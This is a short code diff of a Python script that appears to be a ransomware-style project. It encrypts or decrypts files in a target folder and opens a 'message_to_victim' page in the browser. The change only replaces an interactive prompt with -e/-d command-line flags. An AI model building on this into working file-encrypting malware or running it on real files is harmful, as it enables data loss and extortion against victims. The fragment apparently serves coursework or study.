@@ -1,18 +1,24 @@
 from product_cipher import *
 from functions import *
-import webbrowser
 from shutil import copy
-import os
+import os,getopt,sys,webbrowser
 # from os.path import expanduser
 
 
 # Main controller that gets input from the user and a list of files
 # and sends them off to be encrypted or decrypted
-def main():
+def main(argv):    
 
     # Create the key and get mode from the user
     key = createKey()
-    mode = input('Select "encrypt" or "decrypt": ')
+    if (len(sys.argv)) != 2:
+        print("Incorrect usage")
+        print("Usage: python3 main_program.py -e")
+        print("Usage: python3 main_program.py -d")
+        sys.exit(2)
+    else:
+        mode = getOption(argv)
+    # mode = input('Select "encrypt" or "decrypt": ')
 
     # Specify the root directory
     path = "target_folder/"
@@ -57,4 +63,4 @@ def main():
         webbrowser.open(message_to_victim, new=1)
 
 
-main()
+main(sys.argv[1:])
